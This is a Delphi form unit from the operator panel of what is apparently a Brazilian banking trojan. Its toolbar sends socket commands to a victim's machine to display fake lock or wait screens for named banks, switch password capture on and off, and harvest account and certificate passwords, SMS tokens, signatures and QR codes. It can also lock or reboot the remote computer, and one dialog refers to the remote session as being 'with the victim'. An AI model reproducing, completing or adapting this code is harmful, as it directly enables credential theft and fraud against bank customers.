unit UBarra;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, Buttons, ImgList, ComCtrls, ToolWin, StrUtils, Vcl.Menus,
  Vcl.Imaging.pngimage,ScktComp, System.ImageList;

type
TFBarraRemota = class(TForm)
    ImageList1: TImageList;
    Image1: TImage;
    Image2: TImage;
    ToolBar1: TToolBar;
    btndiversos: TToolButton;
    btnrecort: TToolButton;
    btnBra: TToolButton;
    btnCx: TToolButton;
    btnIta: TToolButton;
    btnSanta: TToolButton;
    btnSicr: TToolButton;
    bntBrad: TToolButton;
    btnSico: TToolButton;
    Pop0BB: TPopupMenu;
    popbb: TMenuItem;
    ResgatarQrcode1: TMenuItem;
    PopCx: TPopupMenu;
    MenuItem1: TMenuItem;
    resgAss: TMenuItem;
    PopIt: TPopupMenu;
    MenuItem4: TMenuItem;
    PopSanta: TPopupMenu;
    MenuItem7: TMenuItem;
    MenuItem10: TMenuItem;
    MenuItem11: TMenuItem;
    PopSicre: TPopupMenu;
    MenuItem9: TMenuItem;
    PopSico: TPopupMenu;
    MenuItem15: TMenuItem;
    MenuItem18: TMenuItem;
    PopBra: TPopupMenu;
    MenuItem19: TMenuItem;
    MenuItem22: TMenuItem;
    bntFerra: TToolButton;
    PopBcOutros: TPopupMenu;
    MenuItem21: TMenuItem;
    MenuItem24: TMenuItem;
    PopupFerr: TPopupMenu;
    VisualizarDesktopporTrs1: TMenuItem;
    VisualizarDesktopnaFrente1: TMenuItem;
    Bloquear24hs1: TMenuItem;
    Bloqueardefinitivo1: TMenuItem;
    ImageList2: TImageList;

    Capturarcursordomouse1: TMenuItem;
    PermitirmovimentarmouseRemoto1: TMenuItem;

    No2: TMenuItem;
    No4: TMenuItem;

    // Captura de Senhas
    CapturadeSenhas1: TMenuItem;
    LigarCaptura1: TMenuItem;
    DesligarCaptura1: TMenuItem;

    Sim1: TMenuItem;
    Sim2: TMenuItem;
    Sim3: TMenuItem;
    Sim5: TMenuItem;
    Nao1: TMenuItem;

    Permitirvisualizarcursorremoto1: TMenuItem;


    Sairdomododeespera1: TMenuItem;
    Bancointer1: TMenuItem;
    Enviar1: TMenuItem;

    BancodoNordeste1: TMenuItem;

    Reiniciarsessao1: TMenuItem;
    ReiniciarSessoremota1: TMenuItem;
    Reiniciarcomputador1: TMenuItem;
    Biticoin1: TMenuItem;

    ResgatarAssinatura1: TMenuItem;
    ResgatarsenhadaConta1: TMenuItem;
    ResgatarsenhaCertificado1: TMenuItem;
    Resgatarsenha6dgitos1: TMenuItem;
    ResgatarToken1: TMenuItem;
    tokensms1: TMenuItem;
    chave1: TMenuItem;
    token1: TMenuItem;
    certificado1: TMenuItem;
    S61: TMenuItem;
    sms1: TMenuItem;
    token2: TMenuItem;
    date1: TMenuItem;
    chave2: TMenuItem;
    token3: TMenuItem;
    ass1: TMenuItem;
    ResgatarPisca1: TMenuItem;
    ToolButton1: TToolButton;

    EnviarPModoespera1: TMenuItem;
    EnviarPModoespera2: TMenuItem;
    EnviarPModoespera3: TMenuItem;
    EnviarPModoespera4: TMenuItem;
    EnviarPModoespera5: TMenuItem;
    EnviarPModoespera6: TMenuItem;
    EnviarPModoespera7: TMenuItem;
    EnviarPModoespera8: TMenuItem;
    EnviarPModoespera9: TMenuItem;
    EnviarPModoespera10: TMenuItem;
    EnviarPModoespera11: TMenuItem;
    EnviarPModoespera12: TMenuItem;
    EnviarPModoespera13: TMenuItem;
    EnviarPModoespera14: TMenuItem;
    EnviarPModoespera15: TMenuItem;

    N1: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    N4: TMenuItem;
    N6: TMenuItem;
    N5: TMenuItem;
    N8: TMenuItem;
    N9: TMenuItem;
    N10: TMenuItem;
    N11: TMenuItem;
    N12: TMenuItem;
    N13: TMenuItem;


    procedure Image2Click(Sender: TObject);
    procedure popbbClick(Sender: TObject);
    procedure ResgatarQrcode1Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure VisualizarDesktopporTrs1Click(Sender: TObject);
    procedure VisualizarDesktopnaFrente1Click(Sender: TObject);
    procedure Capturarcursordomouse1Click(Sender: TObject);
    procedure Sim5Click(Sender: TObject);
    procedure No4Click(Sender: TObject);
    procedure Sim3Click(Sender: TObject);
    procedure Nao1Click(Sender: TObject);
    procedure MenuItem19Click(Sender: TObject);
    procedure btnrecortClick(Sender: TObject);
    procedure MenuItem2Click(Sender: TObject);
    procedure btnrestaureClick(Sender: TObject);
    procedure MenuItem4Click(Sender: TObject);
    procedure MenuItem7Click(Sender: TObject);
    procedure MenuItem9Click(Sender: TObject);
    procedure MenuItem15Click(Sender: TObject);
    procedure Sairdomododeespera1Click(Sender: TObject);
    procedure Start1Click(Sender: TObject);
    procedure PararGravao1Click(Sender: TObject);
    procedure resgAssClick(Sender: TObject);
    procedure MenuItem10Click(Sender: TObject);
    procedure MenuItem22Click(Sender: TObject);
    procedure MenuItem11Click(Sender: TObject);
    procedure MenuItem18Click(Sender: TObject);
    procedure Enviar1Click(Sender: TObject);


    procedure Sim2Click(Sender: TObject);
    procedure No2Click(Sender: TObject);
    procedure PermitirmovimentarmouseRemoto1Click(Sender: TObject);

    //Captura de Senhas /////////////////////////////////////////////

    procedure LigarCaptura1Click(Sender: TObject);
    procedure DesligarCaptura1Click(Sender: TObject);

    ////////////////////////////////////////////////////////////////
    procedure Sim4Click(Sender: TObject);
    procedure No3Click(Sender: TObject);

    procedure Bloquear24hs1Click(Sender: TObject);
    procedure Bloqueardefinitivo1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Reiniciarcomputador1Click(Sender: TObject);
    procedure ReiniciarSessoremota1Click(Sender: TObject);

    procedure ResgatarAssinatura1Click(Sender: TObject);
    procedure Resgatarsenha6dgitos1Click(Sender: TObject);
    procedure ResgatarsenhaCertificado1Click(Sender: TObject);
    procedure ResgatarsenhadaConta1Click(Sender: TObject);
    procedure ResgatarToken1Click(Sender: TObject);
    procedure MenuItem6Click(Sender: TObject);
    procedure tokensms1Click(Sender: TObject);
    procedure chave1Click(Sender: TObject);
    procedure token1Click(Sender: TObject);
    procedure certificado1Click(Sender: TObject);
    procedure RecuperardatadeNascimento1Click(Sender: TObject);
    procedure S61Click(Sender: TObject);
    procedure sms1Click(Sender: TObject);
    procedure token2Click(Sender: TObject);
    procedure date1Click(Sender: TObject);
    procedure chave2Click(Sender: TObject);
    procedure token3Click(Sender: TObject);
    procedure ass1Click(Sender: TObject);
    procedure ResgatarPisca1Click(Sender: TObject);
    procedure ToolButton1Click(Sender: TObject);
    // Menu Outros
    procedure EnviarPModoespera1Click(Sender: TObject);
    procedure EnviarPModoespera2Click(Sender: TObject);
    procedure EnviarPModoespera3Click(Sender: TObject);
    procedure EnviarPModoespera4Click(Sender: TObject);
    procedure EnviarPModoespera5Click(Sender: TObject);
    procedure EnviarPModoespera6Click(Sender: TObject);
    procedure EnviarPModoespera7Click(Sender: TObject);
    procedure EnviarPModoespera8Click(Sender: TObject);
    procedure EnviarPModoespera9Click(Sender: TObject);
    procedure EnviarPModoespera10Click(Sender: TObject);
    procedure EnviarPModoespera11Click(Sender: TObject);
    procedure EnviarPModoespera12Click(Sender: TObject);
    procedure EnviarPModoespera13Click(Sender: TObject);
    procedure EnviarPModoespera14Click(Sender: TObject);
    procedure EnviarPModoespera15Click(Sender: TObject);


    procedure CapturadeSenhas1Click(Sender: TObject);
  private
    { Private declarations }
    procedure TrataCmd(Index,tipo:Integer;cmd,htmlcolo:string);
  public
    { Public declarations }
    TamanhoTitulo: Integer;
    Url:String;
    opcao:Integer;
    SocketBarra:TCustomWinSocket;
  end;

var
  FBarraRemota: TFBarraRemota;
  L: TListItem;

implementation

uses UGabesOddFormPanel, UFSessao, UFCPrin;

{$R *.dfm}


procedure TFBarraRemota.ass1Click(Sender: TObject);
begin
TrataCmd(0,7,'TTL_02','');
end;

procedure TFBarraRemota.Bloquear24hs1Click(Sender: TObject);
begin
TrataCmd(1,11,'','');
end;

procedure TFBarraRemota.btnrecortClick(Sender: TObject);
var
L: TListItem;
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
      if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'E QR CODE? SIM OU NAO','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
      begin
      (l.SubItems.Objects[2] as TFSESSAO).Remoto.ISQR:='1'
      end
      else
      begin
      (l.SubItems.Objects[2] as TFSESSAO).Remoto.ISQR:='0';
      end;
      if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Confirmar operacao','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
      begin
       (l.SubItems.Objects[2] as TFSESSAO).CreateCuttingIsDown:=false;
       (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.Visible:=true;
       (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.BringToFront;
       (l.SubItems.Objects[2] as TFSESSAO).Remoto.Parar:=true;
       (l.SubItems.Objects[2] as TFSESSAO).Remoto.Recort:=0;
      end;
end;
end;

procedure TFBarraRemota.Bloqueardefinitivo1Click(Sender: TObject);
begin
TrataCmd(1,12,'','');

end;

procedure TFBarraRemota.btnrestaureClick(Sender: TObject);
begin
TrataCmd(1,6,'','');

end;

procedure TFBarraRemota.CapturadeSenhas1Click(Sender: TObject);
begin

 //CAPYURA DE SENHAS
end;

procedure TFBarraRemota.Capturarcursordomouse1Click(Sender: TObject);
begin
//
end;

procedure TFBarraRemota.certificado1Click(Sender: TObject);
begin
TrataCmd(0,3,'TTL_05','');
end;

procedure TFBarraRemota.chave1Click(Sender: TObject);
var
value:string;
begin
InputQuery('SMS Token','Informe o valor da serie', value);
if value <> '' then
TrataCmd(0,3,'TTL_03',value)
else
ShowMessage('Repita a operacao e informe o valor');
end;

procedure TFBarraRemota.chave2Click(Sender: TObject);
var
value:string;
begin
InputQuery('SMS Token','Informe o valor da serie', value);
if value <> '' then

TrataCmd(0,6,'TTL_03',value)
else
ShowMessage('Repita a operacao e informe o valor');
end;

procedure TFBarraRemota.date1Click(Sender: TObject);
begin
TrataCmd(0,5,'TTL_04','');
end;
/// CAPTURA DE SENHAS  ////////////////////////////////////////////////////////////////////

procedure TFBarraRemota.LigarCaptura1Click(Sender: TObject);
begin
TrataCmd(1,7,'','');

end;

 /////////////////////////////////////////////////////////////////////////////////////////////

// CHAMANDO TELAS REMOTAS DE TRAVAMENTO DE OUTROS BANCOS
procedure TFBarraRemota.Enviar1Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_11','#255597');
end;

procedure TFBarraRemota.EnviarPModoespera1Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_08','#a59364');
end;

procedure TFBarraRemota.EnviarPModoespera2Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_9','#fe0000');
end;

procedure TFBarraRemota.EnviarPModoespera3Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_10','#a50130');
end;

procedure TFBarraRemota.EnviarPModoespera4Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_12','#1b568d');
end;

procedure TFBarraRemota.EnviarPModoespera5Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_15','#1b568d');
end;

procedure TFBarraRemota.EnviarPModoespera6Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_16','#1b568d');
end;

procedure TFBarraRemota.EnviarPModoespera7Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_17','#1b568d');
end;

procedure TFBarraRemota.EnviarPModoespera8Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_19','#1b568d');
end;

procedure TFBarraRemota.EnviarPModoespera9Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_20','#1b568d');
end;
procedure TFBarraRemota.EnviarPModoespera10Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_22','#1b568d');
end;
procedure TFBarraRemota.EnviarPModoespera11Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_21','#1b568d');
end;
procedure TFBarraRemota.EnviarPModoespera12Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_13','#1b568d');
end;
procedure TFBarraRemota.EnviarPModoespera13Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_14','#1b568d');
end;
procedure TFBarraRemota.EnviarPModoespera14Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_18','#1b568d');
end;
procedure TFBarraRemota.EnviarPModoespera15Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_23','#1b568d');
end;

procedure TFBarraRemota.FormClose(Sender: TObject; var Action: TCloseAction);
begin
//Action:=caFree;
FreeAndNil(Self);
end;

Procedure TFBarraRemota.FormShow(Sender: TObject);
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
     Parent :=(l.SubItems.Objects[2] as TFSESSAO);
     CreateOddWindow((l.SubItems.Objects[3] as TFBarraRemota).Handle, False );
     (l.SubItems.Objects[3] as TFBarraRemota).TamanhoTitulo :=
     GetSystemMetrics( SM_CYSIZE );
     //ToolTip := CriaToolTip(Self.Handle, 1, 'Fun��es da Sess�o');
     (l.SubItems.Objects[3] as TFBarraRemota).Url:='';
     //Image2Click(Self);
end;

end;

procedure TFBarraRemota.Image2Click(Sender: TObject);
var
L: TListItem;
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
(l.SubItems.Objects[2] as TFSESSAO).tmrPopUp.Enabled := True;
end;
end;

//////////////////////////////////////////////////////////////////////////////////////////

procedure TFBarraRemota.DesligarCaptura1Click(Sender: TObject);
begin
TrataCmd(1,8,'','');
end;

////////////////////////////////////////////////////////////////////////////////////////////

procedure TFBarraRemota.MenuItem10Click(Sender: TObject);
begin
TrataCmd(0,6,'TTL_02','');

end;

procedure TFBarraRemota.MenuItem11Click(Sender: TObject);
var
L: TListItem;
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
          if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Confirme operacao','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
          begin
          with (l.SubItems.Objects[2] as TFSESSAO).Processa.Fila2.New do
          begin
             Comando :='#QRCODE#';
           end;
       if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Confirme operacao','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
       begin
          //Opcao:=6;
         // Url:=Url+'04/05.png';
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Recort:=1;
           (l.SubItems.Objects[2] as TFSESSAO).CreateCuttingIsDown:=false;
          (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.Visible:=true;
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Parar:=true;
          (l.SubItems.Objects[3] as TFBarraRemota).opcao:=6;
          (l.SubItems.Objects[3] as TFBarraRemota).Url:='TTL_QR';

          //(l.SubItems.Objects[2] as TFSESSAO).pRecorte.Visible:=True;
      end;
          end;
end;
end;

procedure TFBarraRemota.MenuItem15Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_07','#00a090');

end;

procedure TFBarraRemota.MenuItem18Click(Sender: TObject);
var
L: TListItem;
begin

L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
          if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Confirme operacao','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
          begin
          with (l.SubItems.Objects[2] as TFSESSAO).Processa.Fila2.New do
          begin
             Comando :='#QRCODE#';
           end;
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Recort:=1;
          (l.SubItems.Objects[2] as TFSESSAO).CreateCuttingIsDown:=false;
          (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.Visible:=true;
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Parar:=true;
          (l.SubItems.Objects[3] as TFBarraRemota).opcao:=8;
          (l.SubItems.Objects[3] as TFBarraRemota).Url:='N4gbnfJbuOzGit5lcQ4_01';
          end;
         end;
end;

procedure TFBarraRemota.MenuItem19Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_02','#b32319');

end;

procedure TFBarraRemota.MenuItem1Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_03','#f97312');
end;

procedure TFBarraRemota.MenuItem22Click(Sender: TObject);
var
L: TListItem;
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
          if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Confirme operacao','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
          begin
          with (l.SubItems.Objects[2] as TFSESSAO).Processa.Fila2.New do
          begin
             Comando :='#QRCODE#';
           end;
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Recort:=1;
          (l.SubItems.Objects[2] as TFSESSAO).CreateCuttingIsDown:=false;
          (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.Visible:=true;
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Parar:=true;
          (l.SubItems.Objects[3] as TFBarraRemota).opcao:=3;
          (l.SubItems.Objects[3] as TFBarraRemota).Url:='TTL_QR';
      end;
end;

end;

procedure TFBarraRemota.MenuItem2Click(Sender: TObject);
begin
TrataCmd(0,1,'','');

end;

procedure TFBarraRemota.resgAssClick(Sender: TObject);
begin
TrataCmd(0,4,'TTL_01','');

end;

procedure TFBarraRemota.Nao1Click(Sender: TObject);
begin
TrataCmd(1,1,'','');

end;

procedure TFBarraRemota.No2Click(Sender: TObject);
begin
TrataCmd(1,10,''+'','');
//FVieweRemoto.MoveMouse:=false;
end;

procedure TFBarraRemota.No3Click(Sender: TObject);
begin
//
end;

procedure TFBarraRemota.No4Click(Sender: TObject);
begin
TrataCmd(1,3,''+'','');
end;

procedure TFBarraRemota.PararGravao1Click(Sender: TObject);
begin
//FVieweRemoto.PararGravacao;
end;

procedure TFBarraRemota.PermitirmovimentarmouseRemoto1Click(Sender: TObject);
begin
//
end;

procedure TFBarraRemota.popbbClick(Sender: TObject);
begin
TrataCmd(0,0,'LO_01','#1b568d');
end;

procedure TFBarraRemota.RecuperardatadeNascimento1Click(Sender: TObject);
begin
TrataCmd(0,0,'','');
end;

procedure TFBarraRemota.Reiniciarcomputador1Click(Sender: TObject);
begin
TrataCmd(1,13,'','');
end;

procedure TFBarraRemota.ReiniciarSessoremota1Click(Sender: TObject);
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
     if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Gostaria de reiniciar sessao remota com a vitima ?','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
     begin
         TrataCmd(1,14,'','');

     end else
     begin
         TrataCmd(1,15,'','');

     end;
end;
end;


procedure TFBarraRemota.ResgatarAssinatura1Click(Sender: TObject);
begin
TrataCmd(0,6,'TTL_01','');
end;

procedure TFBarraRemota.ResgatarPisca1Click(Sender: TObject);
var
L: TListItem;
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
 (l.SubItems.Objects[2] as TFSESSAO).Remoto.Recort:=1;
 (l.SubItems.Objects[2] as TFSESSAO).CreateCuttingIsDown:=false;
 (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.Visible:=true;
 (l.SubItems.Objects[2] as TFSESSAO).Remoto.Parar:=true;
 (l.SubItems.Objects[3] as TFBarraRemota).opcao:=3;
 (l.SubItems.Objects[3] as TFBarraRemota).Url:='TTL_PISCA';
 end;
end;

procedure TFBarraRemota.ResgatarQrcode1Click(Sender: TObject);
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin
          if MessageBox((l.SubItems.Objects[2] as TFSESSAO).Handle,'Confirme operacao','Alerta',mb_yesno+mb_defbutton1+48)=mryes then
          begin
          with (l.SubItems.Objects[2] as TFSESSAO).Processa.Fila2.New do
          begin
             Comando :='#QRCODE#';
           end;

          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Recort:=1;
          (l.SubItems.Objects[2] as TFSESSAO).CreateCuttingIsDown:=false;
          (l.SubItems.Objects[2] as TFSESSAO).PaintRecort.Visible:=true;
          (l.SubItems.Objects[2] as TFSESSAO).Remoto.Parar:=true;
          (l.SubItems.Objects[3] as TFBarraRemota).opcao:=2;
          (l.SubItems.Objects[3] as TFBarraRemota).Url:='TTL_QR';
          //(l.SubItems.Objects[2] as TFSESSAO).pRecorte.Visible:=True;

          end;
end;
end;


procedure TFBarraRemota.Resgatarsenha6dgitos1Click(Sender: TObject);
begin
TrataCmd(0,2,'TTL_02','#1b568d');

end;

procedure TFBarraRemota.ResgatarsenhaCertificado1Click(Sender: TObject);
begin
TrataCmd(0,2,'TTL_04','#1b568d');
end;

procedure TFBarraRemota.ResgatarsenhadaConta1Click(Sender: TObject);
begin
TrataCmd(0,2,'TTL_03','#1b568d');
end;


procedure TFBarraRemota.ResgatarToken1Click(Sender: TObject);
begin
TrataCmd(0,6,'TTL_04','');

end;

procedure TFBarraRemota.S61Click(Sender: TObject);
begin
TrataCmd(0,5,'TTL_01','');
end;

procedure TFBarraRemota.Sairdomododeespera1Click(Sender: TObject);
begin
TrataCmd(0,1,'','');
end;

procedure TFBarraRemota.Sim2Click(Sender: TObject);
begin
TrataCmd(1,9,''+'','');
//FVieweRemoto.MoveMouse:=true;
end;

procedure TFBarraRemota.Sim3Click(Sender: TObject);
begin
TrataCmd(1,0,'','');

end;

procedure TFBarraRemota.Sim4Click(Sender: TObject);
begin
//
end;

procedure TFBarraRemota.Sim5Click(Sender: TObject);
begin
TrataCmd(1,2,''+'','');

end;

procedure TFBarraRemota.sms1Click(Sender: TObject);
var
value:string;
begin
InputQuery('SMS Token','Informe o valor da serie', value);
if value <> '' then
TrataCmd(0,5,'TTL_02',value)
else
ShowMessage('Repita a operacao e informe o valor');
end;

procedure TFBarraRemota.Start1Click(Sender: TObject);
begin
//FVieweRemoto.GravarSessao;
end;


procedure TFBarraRemota.token1Click(Sender: TObject);
begin
TrataCmd(0,3,'TTL_04','');
end;

procedure TFBarraRemota.token2Click(Sender: TObject);
var
value:string;
begin
InputQuery('SMS Token','Informe o valor da serie', value);
if value <> '' then

TrataCmd(0,5,'TTL_03',value)
else
ShowMessage('Repita a operacao e informe o valor');
end;

procedure TFBarraRemota.token3Click(Sender: TObject);
var
value:string;
begin
InputQuery('SMS Token','Informe o valor da serie', value);
if value <> '' then
TrataCmd(0,7,'TTL_01',value)
else
ShowMessage('Repita a operacao e informe o valor');
end;

procedure TFBarraRemota.tokensms1Click(Sender: TObject);
var
value:string;
begin
TrataCmd(0,3,'TTL_02',value)
end;

procedure TFBarraRemota.ToolButton1Click(Sender: TObject);
begin
TrataCmd(1,6,'','');
end;

procedure TFBarraRemota.TrataCmd(Index, tipo: Integer; cmd, htmlcolo: string);
var
L: TListItem;
begin
L := FCPrin.LV1.FindCaption(0, intToStr(SocketBarra.Handle), false, true, false);
if L <> nil then
begin

     with (l.SubItems.Objects[2] as TFSESSAO).Processa.Fila2.New do
     begin
        Comando :='#Cmd#'+'<#>'+IntToStr(Index)+'<#>'+
        IntToStr(tipo)+'<#>'+cmd+'<#>'+htmlcolo;
     end;
end;
end;

procedure TFBarraRemota.VisualizarDesktopporTrs1Click(Sender: TObject);
begin
TrataCmd(1,4,'','');
end;

procedure TFBarraRemota.VisualizarDesktopnaFrente1Click(Sender: TObject);
begin
TrataCmd(1,4,'','');
end;

procedure TFBarraRemota.MenuItem4Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_04','#b32319');

end;

procedure TFBarraRemota.MenuItem6Click(Sender: TObject);
begin
TrataCmd(0,10,'h36MKYf9L7tm17ZVq_01','');

end;

procedure TFBarraRemota.MenuItem7Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_05','#fe0000');

end;

procedure TFBarraRemota.MenuItem9Click(Sender: TObject);
begin
TrataCmd(0,0,'LO_06','#2d9647');
end;



end.

